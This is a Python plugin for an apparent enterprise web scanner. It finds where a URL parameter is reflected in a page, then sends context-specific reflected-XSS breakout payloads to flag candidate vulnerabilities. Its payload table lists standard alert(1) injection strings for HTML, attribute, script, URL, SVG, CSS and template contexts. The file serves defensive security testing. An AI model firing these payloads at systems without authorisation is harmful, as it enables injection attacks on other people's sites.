"""
Enterprise Reflected XSS Detection Plugin.

Determines reflection context and emits DetectionCandidate objects.
Does NOT verify execution (handled by centralized verification engine).
"""
import hashlib
import urllib.parse
from typing import List, Union, Dict

import structlog
from selectolax.parser import HTMLParser

from ...interfaces.active import ActivePluginInterface
from ...passive.models import PluginMetadata
from ...network.http.manager import HTTPClientManager
from ...network.models import HTTPRequest, HTTPResponse
from ...models.finding import Finding, Evidence, VerificationStatus, Severity, Confidence
from ...crawler.models import Endpoint
from ..models import DetectionCandidate, Payload, PayloadTechnique, TestCase
from ..mutator import EnterpriseRequestMutator

logger = structlog.get_logger(__name__)

class ReflectionContext:
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL_CONTEXT = "url_context"
    SVG = "svg"
    CSS = "css"
    UNQUOTED_ATTRIBUTE = "unquoted_attribute"
    TEMPLATE = "template"
    MARKDOWN = "markdown"

CONTEXT_PAYLOADS = {
    ReflectionContext.HTML_BODY: [
        Payload(value='<img src=x onerror=alert(1)>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value='<script>alert(1)</script>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.HTML_ATTRIBUTE: [
        Payload(value='" onmouseover="alert(1)" x="', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value="' onmouseover='alert(1)' x='", technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.UNQUOTED_ATTRIBUTE: [
        Payload(value=' onmouseover=alert(1) ', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.JAVASCRIPT: [
        Payload(value="</script><img src=x onerror=alert(1)>", technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value="';alert(1);//", technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value='";alert(1);//', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.URL_CONTEXT: [
        Payload(value="javascript:alert(1)", technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value="data:text/html,<script>alert(1)</script>", technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.SVG: [
        Payload(value='"><svg onload=alert(1)>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value='<svg onload=alert(1)>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.CSS: [
        Payload(value='</style><img src=x onerror=alert(1)>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value='</style><script>alert(1)</script>', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
    ReflectionContext.TEMPLATE: [
        Payload(value='{{alert(1)}}', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
        Payload(value='${alert(1)}', technique=PayloadTechnique.CONTEXT_BREAKOUT, category="xss"),
    ],
}

class ReflectedXSSPlugin(ActivePluginInterface):
    """Enterprise XSS detector emitting unverified candidates."""

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            id="ACT-XSS-001",
            name="Reflected Cross-Site Scripting (XSS)",
            description="Detects XSS reflection contexts and generates breakout payload candidates.",
        )

    async def execute(self, endpoint: Union[str, Endpoint], http_manager: HTTPClientManager) -> List[DetectionCandidate]:
        candidates = []
        client = http_manager.get_shared_client()
        endpoint_url = endpoint.url if not isinstance(endpoint, str) else endpoint
        mutator = EnterpriseRequestMutator()

        params = self._get_params(endpoint)
        if not params: return candidates

        vulnerable_params = set()

        for param_name in params:
            if param_name in vulnerable_params: continue

            # Send canary
            canary = f"xss{hashlib.md5(param_name.encode()).hexdigest()[:8]}probe"
            canary_payload = Payload(value=canary, technique=PayloadTechnique.REFLECTION, category="xss")
            case = next((tc for tc in mutator.mutate(endpoint, [canary_payload]) if tc.mutated_parameter == param_name), None)
            
            if not case: continue
            
            resp = await client.send(case.request)
            resp_text = resp.text if isinstance(resp.text, str) else ""
            content_type = resp.headers.get("content-type", "").lower()

            if not any(t in content_type for t in ["text/html", "application/xhtml+xml", ""]) or canary not in resp_text:
                continue

            # Analyze context
            contexts = self._analyze_contexts(resp_text, canary)
            
            for context_type in contexts:
                if param_name in vulnerable_params: break
                
                payloads = CONTEXT_PAYLOADS.get(context_type, [])
                for payload in payloads:
                    xss_case = next((tc for tc in mutator.mutate(endpoint, [payload]) if tc.mutated_parameter == param_name), None)
                    if not xss_case: continue
                    
                    xss_resp = await client.send(xss_case.request)
                    
                    candidate = DetectionCandidate(
                        plugin_id=self.metadata.id,
                        vulnerability_type="xss",
                        technique=PayloadTechnique.CONTEXT_BREAKOUT,
                        endpoint=endpoint_url,
                        parameter=param_name,
                        payload=payload,
                        fuzzed_request=xss_case.request,
                        fuzzed_response=xss_resp,
                        reflection_context=context_type,
                    )
                    candidates.append(candidate)
                    vulnerable_params.add(param_name)
                    break

        return candidates

    def _get_params(self, endpoint: Union[str, Endpoint]) -> Dict[str, str]:
        if isinstance(endpoint, str):
            parsed = urllib.parse.urlparse(endpoint)
            return dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        return endpoint.parameters or {}

    def _analyze_contexts(self, html_text: str, canary: str) -> List[str]:
        contexts = []
        try: tree = HTMLParser(html_text)
        except Exception: 
            if canary in html_text:
                return [ReflectionContext.HTML_BODY, ReflectionContext.MARKDOWN]
            return []

        for node in tree.css("script"):
            if canary in (node.text() or ""): contexts.append(ReflectionContext.JAVASCRIPT)
        for node in tree.css("style"):
            if canary in (node.text() or ""): contexts.append(ReflectionContext.CSS)
        for node in tree.css("svg"):
            if canary in (node.html or ""): contexts.append(ReflectionContext.SVG)
        for node in tree.css("*"):
            for attr_name, attr_val in node.attributes.items():
                if canary in (attr_val or ""):
                    if attr_name.lower() in ("href", "src", "action", "formaction", "data"):
                        contexts.append(ReflectionContext.URL_CONTEXT)
                    elif attr_name.lower() in ("ng-bind", "ng-model", "v-bind", ":class", "v-model"):
                        contexts.append(ReflectionContext.TEMPLATE)
                    else:
                        node_html = node.html or ""
                        if f'"{canary}' in node_html or f"'{canary}" in node_html:
                            contexts.append(ReflectionContext.HTML_ATTRIBUTE)
                        else:
                            contexts.append(ReflectionContext.UNQUOTED_ATTRIBUTE)
        for node in tree.css("*"):
            if canary in (node.text() or "") and not any(c in contexts for c in [ReflectionContext.JAVASCRIPT, ReflectionContext.CSS, ReflectionContext.SVG]):
                if ReflectionContext.HTML_BODY not in contexts: contexts.append(ReflectionContext.HTML_BODY)

        if not contexts and canary in html_text:
            contexts.append(ReflectionContext.MARKDOWN)
                
        return list(set(contexts))
